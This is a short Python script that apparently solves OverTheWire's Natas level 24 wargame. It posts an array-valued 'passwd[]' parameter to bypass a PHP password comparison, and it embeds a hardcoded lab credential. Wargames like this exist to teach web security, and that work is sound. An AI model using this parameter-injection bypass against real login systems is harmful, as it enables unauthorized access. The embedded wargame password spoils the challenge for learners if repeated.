import requests


r = requests.post("http://natas24.natas.labs.overthewire.org/?passwd[]=lol" , auth=("natas24", "OsRmXFguozKpTZZ5X14zNO43379LZveg"))

print(r.text)
